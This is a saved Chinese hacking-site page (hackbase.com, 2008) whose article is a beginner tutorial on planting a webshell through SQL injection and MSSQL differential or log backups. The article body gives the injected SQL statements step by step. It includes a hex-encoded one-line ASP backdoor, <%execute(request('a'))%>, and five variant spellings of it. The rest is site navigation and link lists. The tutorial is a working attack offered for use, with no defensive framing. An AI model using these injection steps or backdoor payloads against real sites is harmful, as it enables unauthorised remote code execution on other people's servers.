@@ -1,0 +1,570 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0050)http://www.hackbase.com/tech/2008-07-30/41367.html -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=GBK">
+
+<title>mssql差异备份获得的webshell-学院-黑基网</title>
+<meta content="all" name="robots">
+<meta name="Copyright" content="黑基网,版权所有">
+<meta name="keywords" content="mssql差异备份获得的webshell-学院 黑客培训 黑客软件 黑客下载 黑客图片 黑客动画 黑客大全 mssql,差异备份,webshell,,入门 电脑知识 网络技术 黑客教程 编程初步 英语学习 黑客文化 技巧 Windows黑客 Unix黑客 脚本黑客 游戏黑客 网吧黑客 QQ黑客 研究 扫描探测 拒绝服务 脱壳破解 嗅探监听 病毒查杀 漏洞研究 实战 密码破解 网站入侵 免杀挂马 软件修改 远程控制 攻防案例 防护 个人安全 企业安全 网站安全 安全工具 认证培训 政策法规 开发 脚本后门 病毒代码 木马编程 缓冲溢出 外挂开发 私服制作,学院 MSSQL差异备份，就是和前一次备份作对比，把不一样的内容备份下来，这样，只要前一次备份后，插入新的 ...">
+<meta name="description" content="mssql差异备份获得的webshell-学院 黑客培训 黑客软件 黑客下载 黑客图片 黑客动画 黑客大全 MSSQL差异备份，就是和前一次备份作对比，把不一样的内容备份下来，这样，只要前一次备份后，插入新的 ...">
+<link href="http://www.hackbase.com/favicon.ico" rel="shortcut icon">
+<link rel="stylesheet" href="./mssql差异备份获得的webshell-学院-黑基网_files/css.css" type="text/css" media="all">
+<link rel="stylesheet" href="./mssql差异备份获得的webshell-学院-黑基网_files/content.css" type="text/css" media="all">
+<script language="javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/config.js"></script>
+<script language="javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/common.js"></script>
+<script language="javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/prototype.js"></script>
+
+</head>
+<body>
+<div id="main">
+<div id="top">
+<span class="f_l">
+<script language="javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/login.php"></script></span>
+<a href="http://www.hackbase.com/tech/rss.php?catid=62" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/rss.gif" border="0"></a>&nbsp;&nbsp;<a id="StranLink" href="javascript:StranBody()" title="點擊以繁體中文方式浏覽">繁體中文</a>&nbsp;&nbsp;<a href="http://www.hackbase.com/tech/2008-07-30/41367.html#" onclick="this.style.behavior=&#39;url(#default#homepage)&#39;;this.setHomePage (&#39;http://www.hackbase.com/&#39;);">设为首页</a>&nbsp;&nbsp;<a href="http://www.hackbase.com/tech/2008-07-30/41367.html#" onclick="window.external.addFavorite(&#39;http://www.hackbase.com/&#39;,&#39;黑基网&#39;)">加入收藏</a>&nbsp;
+</div>
+
+<div id="header">
+<a href="http://www.hackbase.com/"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/logo.gif" class="logo f_l"></a>
+<div class="topbanner">
+<iframe name="topbanner" marginwidth="1" marginheight="1" height="67" width="710" scrolling="no" align="top" border="0" frameborder="0" src="./mssql差异备份获得的webshell-学院-黑基网_files/topbanner.htm">
+</iframe>
+</div>
+</div>
+
+<div id="menu">
+<span id="search">
+<form onsubmit="this.action=document.search.channelsearch.value" method="get" target="_blank" name="search">
+<input size="18" name="keywords" class="key" value="&#160;&#160;请输入搜索关键字">
+<select name="channelsearch" class="select">  <option value="/news/search.php">资讯</option>
+ 
+ <option value="/soft/search.php">软件</option>
+ 
+ <option value="/tech/search.php">学院</option>
+ 
+ <option value="/picture/search.php">图片</option>
+ 
+  
+  
+ <option value="/lib/search.php">知识</option>
+ 
+ <option value="/subject/search.php">专题</option>
+ 
+  
+  
+
+<option value="/product/search.php">商城</option>
+</select>
+<input type="hidden" name="search" value="1"> <input class="btn" type="submit" name="submit" value="&#160;">
+</form>
+</span>
+<a href="http://www.hackbase.com/">首页 </a>&nbsp;&nbsp;<a title="资讯" href="http://www.hackbase.com/news/" target="_blank">资讯</a>
+&nbsp;<a title="软件" href="http://www.hackbase.com/soft/" target="_blank">软件</a>
+&nbsp;<a title="学院" href="http://www.hackbase.com/tech/" target="_blank">学院</a>
+&nbsp;<a title="图片" href="http://www.hackbase.com/picture/" target="_blank">图片</a>
+&nbsp;<a title="论坛" href="http://bbs.hackbase.com/" target="_blank">论坛</a>
+&nbsp;<a title="人才" href="http://jobs.hackbase.com/" target="_blank">人才</a>
+&nbsp;<a title="知识" href="http://www.hackbase.com/lib/" target="_blank">知识</a>
+&nbsp;<a title="专题" href="http://www.hackbase.com/subject/" target="_blank">专题</a>
+&nbsp;<a title="VIP培训" href="http://vip.hackbase.com/" target="_blank">VIP培训</a>
+&nbsp;<a title="实地培训" href="http://www.hackbase.com/peixun/hcnsp/" target="_blank">实地培训</a>
+
+</div>
+
+<div class="submenu">
+<a href="http://www.hackbase.com/tech/" class="white"> 学院首页</a>
+ | <a href="http://www.hackbase.com/tech/60.html" class="white">入门</a>
+
+ | <a href="http://www.hackbase.com/tech/76.html" class="white">技巧</a>
+
+ | <a href="http://www.hackbase.com/tech/83.html" class="white">研究</a>
+
+ | <a href="http://www.hackbase.com/tech/91.html" class="white">实战</a>
+
+ | <a href="http://www.hackbase.com/tech/98.html" class="white">防护</a>
+
+ | <a href="http://www.hackbase.com/tech/104.html" class="white">开发</a>
+
+| <a href="http://www.hackbase.com/tech/special/" class="white">专题</a>
+</div>
+
+<div class="cont_top"></div>
+<div id="cont">
+<div id="left">
+<div class="position">当前位置：<a href="http://www.hackbase.com/tech/">学院首页</a> &gt;&gt; <a href="http://www.hackbase.com/tech/60.html">入门</a> &gt;&gt; <a href="http://www.hackbase.com/tech/62.html">菜鸟教程</a> &gt;&gt;  mssql差异备份获得的webshell</div>
+<center>
+<iframe name="topbanner" marginwidth="0" marginheight="0" height="89" width="699" scrolling="no" align="top" border="0" frameborder="0" src="./mssql差异备份获得的webshell-学院-黑基网_files/titlebanner.htm">
+</iframe></center>
+<div class="content">
+<h1 class="yin"><br>mssql差异备份获得的webshell </h1>
+<!--副标题--><!--文章属性-->
+<div id="property"> 2008-07-30 17:53:21&nbsp;&nbsp;www.hackbase.com&nbsp;&nbsp;来源：<a href="http://www.hackbase.com/tech/2008-07-30/41367.html#" target="_blank">互联网</a></div>
+<!--引用地址-->
+<div class="introduce">MSSQL差异备份，就是和前一次备份作对比，把不一样的内容备份下来，这样，只要前一次备份后，插入新的内容，差异备份就可以把刚插入的内容备份出来，而这个备份文件将大大减少,得到webShell的成功也提高了不少！ ...</div><div class="content_text">
+<p>MSSQL差异备份，就是和前一次备份作对比，把不一样的内容备份下来，这样，只要前一次备份后，插入新的内容，差异备份就可以把刚插入的内容备份出来，而这个备份文件将大大减少,得到webShell的成功也提高了不少！ </p>
+<p>差异备份的流程大概这样：<br>1.完整备份一次(保存位置当然可以改)<br>backup database 库名 to disk = 'c:\ddd.bak';--</p>
+<p>2.创建表并插曲入数据<br>create table [dbo].[dtest] ([cmd] [image]);<br>insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E);--</p>
+<p>3.进行差异备份<br>backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--</p>
+<p>上面<br>0x3C25657865637574652872657175657374282261222929253E<br>就是一句话木马的内容：&lt;%execute(request("a"))%&gt;</p>
+<p><br>如下是网上常见的差异备份代码，思路一样！<br>===================================================<br>利用差异备份提高提高backupwebshell的成功率,减少文件大小<br>步骤:<br>declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x77006F006B0061006F002E00620061006B00 backup database @a to <a href="mailto:disk=@s">disk=@s</a></p>
+<p>create table [dbo].[xiaolu] ([cmd] [image]);</p>
+<p>insert into xiaolu(cmd) values(0x3C25657865637574652872657175657374282261222929253E)</p>
+<p>declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000 backup database @a to <a href="mailto:disk=@s">disk=@s</a> WITH DIFFERENTIAL,FORMAT</p>
+<p>0x77006F006B0061006F002E00620061006B00为wokao.bak<br>0x3C25657865637574652872657175657374282261222929253E是&lt;%execute(request("a"))%&gt;<br>0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000是e:\web\wokao.asp</p>
+<p>声明：方法不是我想的，我只是写工具，默认得到shell是<br>&lt;%execute(request("a"))%&gt;<br>===============================================================</p>
+<p>我发现上面代码，有时会无效，而直接用</p>
+<p>backup database 库名 to disk = 'c:\ddd.bak'</p>
+<p>create table [dbo].[dtest] ([cmd] [image]);<br>insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E)</p>
+<p>backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--</p>
+<p>却可以成功，所以把最原始的方法写出来！思路是前人所创,这不说大家也知道的！</p>
+<p>库名 必须要有效的库名，一般注入工具都可以得到！如果某站过滤 "‘",就要把字符内容转为数值了！<br>&nbsp;</p>
+<p>&nbsp;</p>
+<p>网上还有log增量备份的，我也把他记录一下<br>=====================================================<br>另一种log增量备份技术:</p>
+<p>';alter database null set RECOVERY FULL--</p>
+<p>';create table cmd (a image)--</p>
+<p>';backup log null to disk = 'f:\cmd' with init--</p>
+<p>';insert into cmd (a) values (0x3C2565786563757465287265717565737428226122292<br>9253EDA)--</p>
+<p>';backup log null to disk = '备份路径'--</p>
+<p>PS:0x3C2565786563757465287265717565737428226122292<br>9253EDA 是一句话小马16进制转来的</p>
+<p>说到一句话马，还可以有这么几种写法：</p>
+<p>a).&lt;%%25Execute(request("a"))%%25&gt;<br>b).&lt;%Execute(request("a"))%&gt;<br>c).%&gt;&lt;%execute request("a")%&gt;&lt;%<br>d).&lt;script language=VBScript runat=server&gt;execute request("a")&lt;/script&gt;<br>e).&lt;%25Execute(request("a"))%25&gt;</p>
+<p>&nbsp;</p></div>
+<div class="clear"></div>
+
+<div class="keywords"><strong>关键字：</strong><a href="http://www.hackbase.com/tech/search.php?searchtype=keywords&keywords=mssql&search=1" target="_blank">mssql</a>
+<a href="http://www.hackbase.com/tech/search.php?searchtype=keywords&keywords=%B2%EE%D2%EC%B1%B8%B7%DD&search=1" target="_blank">差异备份</a>
+<a href="http://www.hackbase.com/tech/search.php?searchtype=keywords&keywords=webshell&search=1" target="_blank">webshell</a>
+</div>
+<!--自定义字段-->
+<table width="100%" align="center" cellspacing="1" cellpadding="5" bgcolor="#ffffff">
+
+</table>
+<!--自定义字段-->
+
+<table border="0" width="100%" id="table1" cellspacing="4" cellpadding="0">
+<tbody><tr>
+<td>
+<p style="line-height: 150%"><font size="2" color="#FF0000">　&nbsp; 免责声明：本文仅代表作者个人观点，与本站无关。其原创性以及文中陈述文字和内容未经本站证实，对本文以及其中全部或者部分内容、文字的真实性、完整性、及时性本站不作任何保证或承诺，请读者仅作参考，并请自行核实相关内容。</font></p></td>
+</tr>
+</tbody></table>
+
+<!--分页--><div class="td_center"></div>
+<h3>责任编辑：<a href="http://www.hackbase.com/member/member.php?username=%BA%DA%BF%CD%BB%F9%B5%D8" class="member_url">黑客基地</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</h3>
+<div class="mar_10"><br><br><span class="font_1">本文引用网址：</span>&nbsp;<span class="border_2">
+
+<script>
+
+function copyToClipBoard(){ 
+
+var clipBoardContent=document.title + '\r\n' + document.location; 
+
+clipBoardContent+='\r\n'; 
+
+window.clipboardData.setData("Text",clipBoardContent); 
+
+alert("恭喜您！复制成功"); 
+
+} 
+
+</script> 
+
+<script language="javascript"> 
+
+document.write("<input size=\"60\" style='color: #666; border-style: dotted; border-width: 1px; background-color: #ffffff' value=\""+document.location+"\"><input type=\"button\" style='border-style: solid; border-width: 1px' value=\"点击复制\" title=\"点击将本文网址复制到剪贴板\" onclick=\"copyToClipBoard()\">&nbsp;&nbsp;与您的QQ/MSN好友分享! "); 
+
+</script><input size="60" style="color: #666; border-style: dotted; border-width: 1px; background-color: #ffffff" value="http://www.hackbase.com/tech/2008-07-30/41367.html"><input type="button" style="border-style: solid; border-width: 1px" value="点击复制" title="点击将本文网址复制到剪贴板" onclick="copyToClipBoard()">&nbsp;&nbsp;与您的QQ/MSN好友分享!  
+
+</span> </div>
+<!--上下文-->
+<div class="border_1" style="border-top:1px solid #ccc;padding-top:10px;margin-top:10px;" id="pre_and_next"><li>上一篇：<a href="http://www.hackbase.com/tech/2008-07-30/41365.html">高手提升权限技巧</a></li><li>下一篇：<a href="http://www.hackbase.com/tech/2008-07-31/41375.html">WEBSHELL权限提升技巧 </a></li></div><br>
+<div id="par" class="iconbox">
+<form action="http://www.hackbase.com/tech/2008-07-30/sendmail.php" name="sendmail" id="sendmail">
+<input type="hidden" name="title" value="推荐《mssql差异备份获得的webshell》">
+<input type="hidden" name="content" value="&lt;a href=http://www.hackbase.com/tech/2008-07-30/41367.html target=_blank&gt;mssql差异备份获得的webshell&lt;br/&gt;http://www.hackbase.com/tech/2008-07-30/41367.html&lt;/a&gt;">
+</form>
+<a href="http://www.hackbase.com/tech/2008-07-30/41367.html#comment" class="comment_icon">发表评论</a>　<a href="javascript:window.external.addFavorite(window.location,'mssql差异备份获得的webshell')" class="favorites_icon">加入收藏</a>　<a href="javascript:$('sendmail').submit();" class="friend_icon">告诉好友</a>　<a href="javascript:window.print();" class="print_icon">打印本页</a>　<a href="javascript:window.close()" class="close_icon">关闭窗口</a>　<a href="http://www.hackbase.com/tech/2008-07-30/41367.html#top" class="top_icon">返回顶部</a></div>
+<div class="title"><h5>mssql差异备份获得的webshell的相关文章<span></span></h5></div>
+<div class="re_shuang">
+<ul>
+<table width="100%" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2010-01-23/59071.html" class="tag_title_link">CityShop v5.5.8 sql injection 0day&amp;后台获取webshell方法</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-12-19/58790.html" class="tag_title_link">Discuz!的最新拿Webshell放法</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-10-31/57540.html" class="tag_title_link">WebShell提权文章大总结</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-10-06/56713.html" class="tag_title_link">MSSQL注入躲避IDS的方法</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-09-26/56459.html" class="tag_title_link">Webshell提权:因为开始菜单的泄密</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-09-02/55611.html" class="tag_title_link">如何在MSSQL执行命令</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-09-02/55594.html" class="tag_title_link">MSSQL安全设置</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-08-10/54764.html" class="tag_title_link">MSSQL 2005安全设置的图文教程</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-08-07/54672.html" class="tag_title_link">mssql 05数据库连接代码示例</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-08-05/54594.html" class="tag_title_link">MSSql基本语句</a>
+ </td>
+</tr>
+
+<tr>
+<td height="20">
+ <a href="http://www.hackbase.com/tech/2009-08-01/54466.html" class="tag_title_link">终结Webshell 加固web服务器 </a>
+ </td>
+</tr>
+
+
+</tbody></table></ul>
+<div class="clear"></div>
+</div>
+<!--<div class="title"><h5>发表评论<span></span></h5></div>-->
+<script type="text/javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/list_js.php"></script><iframe name="vip2009" src="./mssql差异备份获得的webshell-学院-黑基网_files/vip.htm" marginwidth="1" marginheight="1" scrolling="no" border="0" frameborder="0" width="700" height="1000" onload="this.height=vip2009.document.body.scrollHeight"></iframe>
+</div>
+</div>
+<div id="right">
+
+<div class="title"><h5>最 新<span></span></h5></div>
+<ul>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-18/62463.html" title="计算机科学专业应该传授的3件事" target="_blank" style="font-size: 12px">计算机科学专业应该传授的3</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-18/62462.html" title="总结Twitter蠕虫事件　学习五条安全经验" target="_blank" style="font-size: 12px">总结Twitter蠕虫事件　学习</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-18/62459.html" title="对症下药 剔除文件删除顽固障碍" target="_blank" style="font-size: 12px">对症下药 剔除文件删除顽固</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-17/62449.html" title="如何平衡加密与访问控制" target="_blank" style="font-size: 12px">如何平衡加密与访问控制</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-14/62446.html" title="看看电脑高手是怎样维护电脑的" target="_blank" style="font-size: 12px">看看电脑高手是怎样维护电脑</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-14/62438.html" title="U盘怎样制作XP系统盘" target="_blank" style="font-size: 12px">U盘怎样制作XP系统盘</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-13/62431.html" title="第一安全规则:假设你被黑了" target="_blank" style="font-size: 12px">第一安全规则:假设你被黑了</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-13/62430.html" title="心理学：看看黑客如何来破解密码" target="_blank" style="font-size: 12px">心理学：看看黑客如何来破解</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-13/62429.html" title="设计新网站前你需要考虑的60个问题（上）" target="_blank" style="font-size: 12px">设计新网站前你需要考虑的6</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-13/62422.html" title="显示WordPress博客的评论用户所在地及网络" target="_blank" style="font-size: 12px">显示WordPress博客的评论用</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-11/62415.html" title="如何设置虚拟内存" target="_blank" style="font-size: 12px">如何设置虚拟内存</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-10/62402.html" title="批量添加域用户" target="_blank" style="font-size: 12px">批量添加域用户</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-07/62392.html" title="winxp下面看不到iis安装组件如何让xp支持asp" target="_blank" style="font-size: 12px">winxp下面看不到iis安装组件</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-07/62384.html" title="一步步教你做支付宝与Wordpress的系统集成" target="_blank" style="font-size: 12px">一步步教你做支付宝与Wordp</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-06/62382.html" title="windows的telnet默认路径修改" target="_blank" style="font-size: 12px">windows的telnet默认路径修</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-06/62375.html" title="从头开始学代理" target="_blank" style="font-size: 12px">从头开始学代理</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-05/62356.html" title="40个迹象表明你还是PHP菜鸟" target="_blank" style="font-size: 12px">40个迹象表明你还是PHP菜鸟</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-04/62351.html" title="nginx 限制ip并发数和限制速度" target="_blank" style="font-size: 12px">nginx 限制ip并发数和限制速</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-04/62350.html" title="分享6个有用的MySQL语句" target="_blank" style="font-size: 12px">分享6个有用的MySQL语句</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-04/62339.html" title="教你识别灰色软件症状与防范方法" target="_blank" style="font-size: 12px">教你识别灰色软件症状与防范</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-30/62329.html" title="如何恢复误删除的“桌面图标”" target="_blank" style="font-size: 12px">如何恢复误删除的“桌面图标</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-30/62327.html" title="windows 7远程桌面mstsc解说" target="_blank" style="font-size: 12px">windows 7远程桌面mstsc解说</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-28/62315.html" title="IE被恶意修改的十三种简单处理办法" target="_blank" style="font-size: 12px">IE被恶意修改的十三种简单处</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-27/62312.html" title="鲜为人知的Windows八大保密技巧" target="_blank" style="font-size: 12px">鲜为人知的Windows八大保密</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-23/62304.html" title="修改Windows文件夹的颜色" target="_blank" style="font-size: 12px">修改Windows文件夹的颜色</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-23/62300.html" title="13妙招铸造Windows系统金刚不坏之身" target="_blank" style="font-size: 12px">13妙招铸造Windows系统金刚</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-22/62284.html" title="隐藏管理用户的bat" target="_blank" style="font-size: 12px">隐藏管理用户的bat</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-22/62279.html" title="Windows服务器重新启动的非常规方法" target="_blank" style="font-size: 12px">Windows服务器重新启动的非</a>
+    
+</li>
+
+</ul>
+<div class="title"><h5>黑基IT培训<span></span></h5></div>
+<center><a href="http://vip.hackbase.com/" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/vip2010.gif"></a></center>
+<div class="title"><h5>热 点<span></span></h5></div>
+<ul>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-14/62446.html" title="看看电脑高手是怎样维护电脑的" target="_blank" style="font-size: 12px">看看电脑高手是怎样维护电脑</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-23/62304.html" title="修改Windows文件夹的颜色" target="_blank" style="font-size: 12px">修改Windows文件夹的颜色</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-13/62430.html" title="心理学：看看黑客如何来破解密码" target="_blank" style="font-size: 12px">心理学：看看黑客如何来破解</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-27/62312.html" title="鲜为人知的Windows八大保密技巧" target="_blank" style="font-size: 12px">鲜为人知的Windows八大保密</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-23/62300.html" title="13妙招铸造Windows系统金刚不坏之身" target="_blank" style="font-size: 12px">13妙招铸造Windows系统金刚</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-14/62438.html" title="U盘怎样制作XP系统盘" target="_blank" style="font-size: 12px">U盘怎样制作XP系统盘</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-06/62375.html" title="从头开始学代理" target="_blank" style="font-size: 12px">从头开始学代理</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-13/62431.html" title="第一安全规则:假设你被黑了" target="_blank" style="font-size: 12px">第一安全规则:假设你被黑了</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-30/62329.html" title="如何恢复误删除的“桌面图标”" target="_blank" style="font-size: 12px">如何恢复误删除的“桌面图标</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-28/62315.html" title="IE被恶意修改的十三种简单处理办法" target="_blank" style="font-size: 12px">IE被恶意修改的十三种简单处</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-07/62384.html" title="一步步教你做支付宝与Wordpress的系统集成" target="_blank" style="font-size: 12px">一步步教你做支付宝与Wordp</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-18/62463.html" title="计算机科学专业应该传授的3件事" target="_blank" style="font-size: 12px">计算机科学专业应该传授的3</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-05/62356.html" title="40个迹象表明你还是PHP菜鸟" target="_blank" style="font-size: 12px">40个迹象表明你还是PHP菜鸟</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-11/62415.html" title="如何设置虚拟内存" target="_blank" style="font-size: 12px">如何设置虚拟内存</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-22/62284.html" title="隐藏管理用户的bat" target="_blank" style="font-size: 12px">隐藏管理用户的bat</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2010-12-30/62327.html" title="windows 7远程桌面mstsc解说" target="_blank" style="font-size: 12px">windows 7远程桌面mstsc解说</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-07/62392.html" title="winxp下面看不到iis安装组件如何让xp支持asp" target="_blank" style="font-size: 12px">winxp下面看不到iis安装组件</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2011-01-04/62350.html" title="分享6个有用的MySQL语句" target="_blank" style="font-size: 12px">分享6个有用的MySQL语句</a>
+    
+</li>
+
+</ul>
+<div class="title"><h5>图 片<span></span></h5></div>
+<dl class="pic"><a href="http://www.hackbase.com/tech/2008-03-17/40297.html" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/20080401114628193.jpg" width="135" height="100" alt="变种机器狗木马病毒防范"></a>
+<a href="http://www.hackbase.com/tech/2008-03-17/40297.html" title="变种机器狗木马病毒防范" target="_blank">变种机器狗木马病毒防</a>
+</dl>
+
+<dl class="pic"><a href="http://www.hackbase.com/tech/2008-01-08/40063.html" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/20080108031750779.jpg" width="135" height="100" alt="“反黑军团”总教头"></a>
+<a href="http://www.hackbase.com/tech/2008-01-08/40063.html" title="“反黑军团”总教头" target="_blank">“反黑军团”总教头</a>
+</dl>
+
+<dl class="pic"><a href="http://www.hackbase.com/tech/2008-01-08/40062.html" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/20080108030921929.jpg" width="135" height="100" alt="黑客训练营一瞥"></a>
+<a href="http://www.hackbase.com/tech/2008-01-08/40062.html" title="黑客训练营一瞥" target="_blank">黑客训练营一瞥</a>
+</dl>
+
+<dl class="pic"><a href="http://www.hackbase.com/tech/2008-01-03/40056.html" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/20080109021720912.jpg" width="135" height="100" alt="Linux下如何知道某个端口在运行什么程序"></a>
+<a href="http://www.hackbase.com/tech/2008-01-03/40056.html" title="Linux下如何知道某个端口在运行什么程序" target="_blank">Linux下如何知道某个</a>
+</dl>
+
+<dl class="pic"><a href="http://www.hackbase.com/tech/2008-01-03/40055.html" target="_blank"><img src="./mssql差异备份获得的webshell-学院-黑基网_files/20080113012455593.jpg" width="135" height="100" alt="Windows 系统无线局域网安全技术"></a>
+<a href="http://www.hackbase.com/tech/2008-01-03/40055.html" title="Windows 系统无线局域网安全技术" target="_blank">Windows 系统无线局域</a>
+</dl>
+
+
+<div class="title"><h5>推 荐<span></span></h5></div>
+<ul>
+<li>
+<a href="http://www.hackbase.com/tech/2009-12-09/58630.html" title="恶意网页病毒十三大症状分析及修复方法" target="_blank" style="font-size: 12px">恶意网页病毒十三大症状分析及修</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2009-12-02/58519.html" title="揭露Q币/Q号被盗的真相" target="_blank" style="font-size: 12px">揭露Q币/Q号被盗的真相</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2009-01-04/42972.html" title="“伪装网站”的欺诈方法介绍及案例分析" target="_blank" style="font-size: 12px">“伪装网站”的欺诈方法介绍及案</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2008-10-27/42079.html" title="手工查杀病毒常见文件型分析总结" target="_blank" style="font-size: 12px">手工查杀病毒常见文件型分析总结</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2008-10-10/41862.html" title="如何知道自己是不是中木马" target="_blank" style="font-size: 12px">如何知道自己是不是中木马</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2008-10-09/41850.html" title="QQ宝典　六法则保护你安全聊天" target="_blank" style="font-size: 12px">QQ宝典　六法则保护你安全聊天</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2008-10-07/41829.html" title="小技巧解决QQ占用CPU资源过高问题" target="_blank" style="font-size: 12px">小技巧解决QQ占用CPU资源过高问</a>
+    
+</li>
+<li>
+<a href="http://www.hackbase.com/tech/2008-05-05/40626.html" title="机器狗病毒入侵源代码以及入侵原理" target="_blank" style="font-size: 12px">机器狗病毒入侵源代码以及入侵原</a>
+    
+</li>
+
+</ul>
+
+</div>
+</div>
+<div class="cont_bottom"></div>
+<script type="text/javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/show_js.php"></script>
+<script type="text/javascript">
+function fontZoom(size)
+{
+   $('content').style.fontSize=size+'px';
+}
+ 
+</script>
+<script>
+document.body.oncopy = function () { setTimeout( function () { var text = clipboardData.getData("text"); if (text) { text = text + "\r\n本篇文章来源于 黑基网-中国最大的网络安全站点 原文链接："+location.href; clipboardData.setData("text", text); } }, 100 ) }
+</script>
+
+<div id="footer">
+<hr>
+<p class="page"><a href="http://www.hackbase.com/about/hackbase.html" target="_blank">关于黑基</a>
+
+ |&nbsp; <a href="http://www.hackbase.com/about/announce.html" target="_blank">免责条款</a>
+
